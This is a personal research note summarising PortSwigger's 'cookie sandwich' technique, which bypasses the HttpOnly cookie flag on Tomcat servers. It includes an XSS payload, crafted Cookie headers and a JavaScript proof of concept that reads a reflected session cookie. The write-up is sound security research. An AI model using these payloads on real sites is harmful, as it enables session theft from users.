---
author: PortSwigger Research
aliases:
  - Stealing HttpOnly Cookies With the Cookie Sandwich Technique
tags:
  - readwise/articles
url: https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique
created: 2025-01-22
---
# Stealing HttpOnly Cookies With the Cookie Sandwich Technique

![rw-book-cover](https://portswigger.net/cms/images/38/f5/ffaa-twittercard-tweetstststs.png)

The [HttpOnly Cookie Attribute](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/HttpOnly%20Cookie%20Attribute.md) is a fundamental security defense designed to prevent client-side scripts (JavaScript) from accessing sensitive cookies, such as session identifiers. However, [Parser differentials](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Confusion%20Attacks.md) between browsers and web servers can sometimes be exploited to bypass this protection.

This technique is known as the **Cookie Sandwich**.

## The Concept

>[!tldr]
>The core of this attack relies on manipulating how web servers parse the `Cookie` header when special characters—specifically double quotes (`"`)—are involved.

Standard HTTP cookie parsing delimits cookies using semicolons (`;`). However, some servers (such as those strictly adhering to legacy RFCs or specific implementations like Apache #Tomcat) treat content enclosed in double quotes as a single value, even if it contains semicolons.

By "sandwiching" a sensitive `HttpOnly` cookie between two attacker-controlled cookies that use opening and closing quotes, the server can be tricked into interpreting the sensitive cookie as merely part of the attacker's cookie value.

### The Anatomy of a Sandwich

1. **Top Bun:** An attacker-set cookie starting with a quote: `param1="start`
    
2. **The Meat (Target):** The browser automatically inserts the victim's cookie: `sessionId=secret`
    
3. **Bottom Bun:** An attacker-set cookie closing the quote: `param2=end"`
    

When sent to the server, the header looks like this:

`Cookie: param1="start; sessionId=secret; param2=end"`

**The Misinterpretation:** While the browser sees three distinct cookies, a vulnerable server parses this as a **single cookie** named `param1` with the value `"start; sessionId=secret; param2=end"`. If the application reflects the value of `param1` back to the user (e.g., in a JSON response or error message), the attacker can read the `sessionId` via JavaScript, effectively bypassing the `HttpOnly` flag.

---

## Technical Prerequisites: The `$Version` Quirk

Modern browsers and servers often default to RFC 6265, which is stricter about quoting. However, specific environments, particularly **Apache Tomcat**, can be forced into a legacy parsing mode (RFC 2109) using a specific trigger.

- **The Trigger:** The `$Version=1` cookie.
    
- **The Effect:** When [tomcat](tomcat) sees `$Version=1`, it switches parsing rules. It acknowledges quoted strings and ignores the semicolons inside them, enabling the sandwich attack.

### Controlling Cookie Order

For the sandwich to work, the "Top Bun" must appear _before_ the target cookie in the HTTP header. Browsers generally order cookies based on:

1. **Path length:** Longer, more specific paths are sent first.
    
2. **Creation time:** Older cookies are sometimes sent first.
    

Attackers often manipulate the `Path` attribute or creation time to ensure their malicious cookie (`param1`) precedes the victim's session cookie.

---

## Real-World Case Study

This example demonstrates an attack chain involving a Reflected [XSS](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-Site%20Scripting%20(XSS).md) vulnerability and a cookie reflection endpoint.
### Step 1: Identifying the Entry Point (XSS)

The attacker identifies a vulnerable page reflecting link attributes without escaping.

**Payload:**

```html
<link rel="canonical" 
      oncontentvisibilityautostatechange="alert(1)" 
      style="content-visibility:auto">
```

This XSS allows the attacker to execute JavaScript in the victim's browser, which is necessary to set the "sandwich" cookies.

### Step 2: Locating the Reflection

The attacker finds a tracking endpoint (e.g., `tracking.example.com/json`) that:

1. **Reflects a cookie value** (`session`) in its JSON response body.
    
2. **Allows [Cross-origin resource sharing (CORS)](../../Dev,%20ICT%20&%20Cybersec/Web%20&%20Network%20Hacking/Cross-origin%20resource%20sharing%20(CORS).md)** from the vulnerable domain.
    

**Normal Request:**

```http
GET /json?session=ignored HTTP/1.1
Cookie: session=deadbeef;
```

**Response:**

```json
{"session":"deadbeef"}
```

### Step 3: Executing the Sandwich

The attacker's JavaScript (running via the XSS from Step 1) performs the following operations:

1. **Force Legacy Mode:** Sets `$Version=1`.
    
2. **Set Top Bun:** Sets `session="deadbeef`.
    
    - _Note:_ The path is set specifically to ensure this cookie is sent _before_ the target `PHPSESSID`.
        
3. **Set Bottom Bun:** Sets `dummy=qaz"`.
    
4. **Fetch:** Sends a request to the tracking endpoint.
    

**The Malicious Request Header:**

```HTTP
GET /json?session=ignored HTTP/1.1
Cookie: $Version=1; session="deadbeef; PHPSESSID=secret; dummy=qaz"
```

**The Vulnerable Server Response:** Because the server interprets everything inside the quotes as the `session` value, it reflects the sensitive `PHPSESSID` in the JSON body:

```json
{"session":"deadbeef; PHPSESSID=secret; dummy=qaz"}
```

The attacker's script then reads this response text and exfiltrates the `PHPSESSID`.

---

## Proof of Concept Code

The following JavaScript demonstrates the full attack flow. It creates an iframe to target the tracking domain, manipulates the cookies, and executes the sandwich.


```js
async function sandwich(target, cookieName) {
    // 1. Setup target details
    const url = new URL(target);
    const domain = url.hostname;
    const path = url.pathname;

    // 2. Create an iframe to establish context
    const iframe = document.createElement('iframe');
    iframe.src = target;
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    iframe.onload = async () => {
        // 3. Create the Cookie Sandwich
        // Top Bun: Triggers RFC2109 ($Version) and opens the quote
        document.cookie = `$Version=1; domain=${domain}; path=${path};`;
        document.cookie = `${cookieName}="deadbeef; domain=${domain}; path=${path};`;
        
        // Bottom Bun: Closes the quote
        // Note: Using a root path or different path often helps position this last
        document.cookie = `dummy=qaz"; domain=${domain}; path=/;`;

        // 4. Send the request (The sandwich is served)
        try {
            const response = await fetch(target, {
                credentials: 'include', // Essential to send cookies
            });
            
            // 5. Exfiltrate data
            const responseData = await response.text();
            
            // In a real attack, this would send data to the attacker's server
            console.log('Stolen Cookie Data:', responseData);
            alert(responseData); 
        } catch (error) {
            console.error('Error executing sandwich:', error);
        }
    };
}

// Execute the attack
setTimeout(sandwich, 100, 'http://tracking.example.com/json', 'session');
```

---


## Highlights


In this post, I will introduce the "cookie sandwich" technique which lets you bypass the HttpOnly flag on certain servers.
> [View Highlight](https://read.readwise.io/read/01jj7awcptqnj9hhm78kxc8jhv)



The cookie sandwich technique manipulates how web servers parse and handle cookies when special characters are used within them. By cleverly placing quotes and legacy cookies, an attacker can cause the server to misinterpret the structure of the cookie header, potentially exposing HttpOnly cookies to client-side scripts.
> [View Highlight](https://read.readwise.io/read/01jj7ax1c2cwzhfsw8655ka650)



The following code demonstrates how to create a cookie sandwich to steal a restricted cookie value:
 ``document.cookie = `$Version=1;`; document.cookie = `param1="start`; // any cookies inside the sandwich will be placed into param1 value server-side document.cookie = `param2=end";`;``
 The Cookie header in the request/response might appear as:
 `GET / HTTP/1.1 Cookie: $Version=1; param1="start; sessionId=secret; param2=end" => HTTP/1.1 200 OK Set-Cookie: param1="start; sessionId=secret; param2=end";`
> [View Highlight](https://read.readwise.io/read/01jj7b60nd0ny05jexgxm09hsh)



If the application improperly reflects the param1 cookie in the response or does not have the HttpOnly attribute, the entire cookie string, including any HttpOnly session cookie sent by the browser between param1 and param2 - can be exposed.
> [View Highlight](https://read.readwise.io/read/01jj7ba0kqj8mmgkj8g35qymf2)



A "cookie sandwich" attack against a Flask application might look like this:
 `GET / HTTP/1.1 Cookie: param1="start; sessionId=secret; param2=end" => HTTP/1.1 200 OK Set-Cookie: param1="start\073 sessionId=secret\073 param2=end";`
> [View Highlight](https://read.readwise.io/read/01jj7ba8431rm7cfvntmf4qvxp)



Real world example
> [View Highlight](https://read.readwise.io/read/01jj7bd423g0wd80mjd9vtxtzx)



Analytics often employ cookies or URL parameters to monitor user actions, and rarely validate the tracking ID.
> [View Highlight](https://read.readwise.io/read/01jj7bdb32wqssh5s1n6rzcjzr)



<script> {"visitorId":"deadbeef"} </script>
> [View Highlight](https://read.readwise.io/read/01jj7bddqvg410wz7sw42zdrjv)



Stealing an HttpOnly PHPSESSID cookie
> [View Highlight](https://read.readwise.io/read/01jj7bdm55r1gb91e2jrk9gray)



I encountered a vulnerable application with a reflected XSS vulnerability on an error page.
> [View Highlight](https://read.readwise.io/read/01jj7bdyecsbcj171bp1fpbe35)



Step 1: Identifying the XSS Vulnerability
 The vulnerable application reflected certain link and meta attributes without proper escaping.
> [View Highlight](https://read.readwise.io/read/01jj7be6sytk3zaabdqgy7wq9g)



<link rel="canonical" 
 oncontentvisibilityautostatechange="alert(1)" 
 style="content-visibility:auto">
> [View Highlight](https://read.readwise.io/read/01jj7bf6w3m0nycm21jgt5npdy)



Step 2: Finding the Exposed Cookie Parameter
> [View Highlight](https://read.readwise.io/read/01jj7bfcay17y9ndk8p8zzk5q0)



my next objective was to locate an HttpOnly cookie associated with the domain. Initially, I didn’t find any directly accessible analytics JavaScript, but I discovered a tracking domain that reflected the session ID parameter in the JSON response body.
> [View Highlight](https://read.readwise.io/read/01jj7bgrg794bew5xw9gvt9v00)



`GET /json?session=ignored HTTP/1.1 Host: tracking.example.com Origin: https://www.example.com Referer: https://www.example.com/ Cookie: session=deadbeef;` `HTTP/2 200 OK Content-Type: application/json;charset=UTF-8 Access-Control-Allow-Origin: https://www.example.com Access-Control-Allow-Credentials: true {"session":"deadbeef"}`
> [View Highlight](https://read.readwise.io/read/01jj7bh70bc2r46c81831vpmfg)



This website is a great candidate to use in our attack because:
 • reflects cookie value in the response body
 • allows cross origin request from vulnerable domain
> [View Highlight](https://read.readwise.io/read/01jj7bm9kzmw93cvc2rpsjgz78)



Step 3: Exploiting Cookie Downgrade for Exfiltration
> [View Highlight](https://read.readwise.io/read/01jj7bmr39k79fsxr9remy1pcz)



interesting behaviour: although the session URL query parameter is mandatory, the server overwrites its value with the one from the Cookie header. Since the backend runs on Apache Tomcat, I leveraged the phantom $Version cookie to switch to [RFC2109](https://datatracker.ietf.org/doc/html/rfc2109) and execute a cookie sandwich attack.
> [View Highlight](https://read.readwise.io/read/01jj7bneqkpv3na4pjkb8efr1h)



For the $Version cookie to be sent first, it must either be created earlier or have a path attribute longer than all other cookies.
> [View Highlight](https://read.readwise.io/read/01jj7bpsnhdphdb3cmsaz01yhf)



By using a carefully crafted Cookie header, I could manipulate the order of cookies and exploit the reflection vulnerability to capture the HttpOnly PHPSESSID cookie. Here’s an example of the malicious request I used:
 `GET /json?session=ignored Host: tracking.example.com Origin: https://www.example.com Referer: https://www.example.com/ Cookie: $Version=1; session="deadbeef; PHPSESSID=secret; dummy=qaz"` `HTTP/2 200 OK Content-Type: application/json;charset=UTF-8 Access-Control-Allow-Origin: https://www.example.com Access-Control-Allow-Credentials: true {"session":"deadbeef; PHPSESSID=secret; dummy=qaz"}`
> [View Highlight](https://read.readwise.io/read/01jj7bqk44kfbdnc5p7ngf6cw2)



Step 4: Putting It All Together
 To summarize, here’s the process of the attack:
 • The user visits a page containing the oncontentvisibilityautostatechange XSS payload.
 • The injected JavaScript sets cookies $Version=1, session="deadbeef, both cookies have Path value /json to change cookie order.
 • Finally the script appends the cookie dummy=qaz".
 • The script then makes a CORS request to the tracking application endpoint, which reflects the manipulated PHPSESSID cookie in the JSON response.
> [View Highlight](https://read.readwise.io/read/01jj7bs0kp5rxmh6bgtxay63g7)



async function sandwich(target, cookie) { // Step 1: Create an iframe with target src and wait for it 
 const iframe = document.createElement('iframe'); const url = new URL(target); const domain = url.hostname; const path = url.pathname; iframe.src = target; // Hide the iframe 
 iframe.style.display = 'none'; document.body.appendChild(iframe); // Optional: Add your code to check and clean client's cookies if needed 
 iframe.onload = async () => { // Step 2: Create cookie gadget 
 document.cookie = `$Version=1; domain=${domain}; path=${path};`; document.cookie = `${cookie}="deadbeef; domain=${domain}; path=${path};`; document.cookie = `dummy=qaz"; domain=${domain}; path=/;`; // Step 3: Send a fetch request 
 try { const response = await fetch(`${target}`, { credentials: 'include', }); const responseData = await response.text(); // Step 4: Alert response 
 alert(responseData); } catch (error) { console.error('Error fetching data:', error); } }; } setTimeout(sandwich, 100, 'http://example.com/json', 'session');
> [View Highlight](https://read.readwise.io/read/01jj7bs4ev7j48j8m1z61njtk8)

